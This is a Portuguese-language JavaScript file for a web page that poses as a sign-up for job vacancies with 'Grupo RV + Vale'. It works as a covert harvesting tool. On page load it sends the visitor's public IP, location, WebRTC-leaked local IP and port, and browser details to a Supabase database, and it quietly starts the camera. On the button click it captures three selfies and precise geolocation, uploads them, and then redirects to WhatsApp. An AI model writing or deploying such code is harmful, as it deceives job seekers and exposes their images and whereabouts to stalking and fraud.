const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";

const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// Função para salvar
async function salvarNoBanco(dados) {
  const { error } = await supabaseClient.from('checkins').insert([dados]);
  if (error) console.error(error);
  return !error;
}

// Captura de IP + Porta + Básico
async function getInfoBasica() {
  const info = {
    tipo_captura: "previa"
  };

  // IP Externo
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    info.ip = data.ip;
    info.cidade = data.city;
    info.estado = data.region;
    info.pais = data.country_name;
  } catch(e) {}

  // Tentativa de Porta e IP Local via WebRTC
  try {
    const rtc = new RTCPeerConnection({ iceServers: [] });
    rtc.createDataChannel("");
    const offer = await rtc.createOffer();
    await rtc.setLocalDescription(offer);

    rtc.onicecandidate = (e) => {
      if (e.candidate) {
        const cand = e.candidate.candidate;
        const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        const portMatch = cand.match(/(\d{4,5})\s+typ/);
        if (ipMatch) info.local_ip = ipMatch[1];
        if (portMatch) info.local_port = portMatch[1];
      }
    };
  } catch(e) {}

  info.user_agent = navigator.userAgent;
  info.timestamp = new Date().toISOString();

  return info;
}

// ================================================
// SALVAMENTO PRÉVIO (ao abrir a página)
// ================================================
window.onload = async () => {
  statusText.innerHTML = "🟡 Salvando informações iniciais...";

  const infoPrevia = await getInfoBasica();
  await salvarNoBanco(infoPrevia);

  statusText.innerHTML = "✅ Informações iniciais salvas.<br>Clique no botão para completar o cadastro.";

  // Inicia a câmera discretamente
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
  } catch(e) {}
};

// ================================================
// SALVAMENTO COMPLETO (ao clicar no botão)
// ================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
    statusText.innerHTML = "📸 Capturando fotos e dados completos...";

    // Captura fotos
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for (let i = 0; i < 3; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      fotos.push(canvas.toDataURL("image/jpeg", 0.45));
      if (i < 2) await new Promise(r => setTimeout(r, 800));
    }

    // Desliga câmera
    if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());

    // Geolocalização
    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      const pos = await new Promise((resolve, reject) => 
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true })
      );
      latitude = pos.coords.latitude;
      longitude = pos.coords.longitude;
    } catch(e) {}

    const infoBasica = await getInfoBasica();
    infoBasica.tipo_captura = "completo";
    infoBasica.selfies = fotos;
    infoBasica.latitude = latitude.toString();
    infoBasica.longitude = longitude.toString();

    const sucesso = await salvarNoBanco(infoBasica);

    if (sucesso) {
      statusText.innerHTML = "✅ Cadastro completo realizado com sucesso!";
      falar("Cadastro concluído com sucesso.");
      
      setTimeout(() => {
        window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
      }, 2200);
    }

  } catch (err) {
    console.error(err);
    statusText.innerHTML = "❌ Ocorreu um erro. Tente novamente.";
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});

function falar(texto) {
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  speechSynthesis.speak(fala);
}
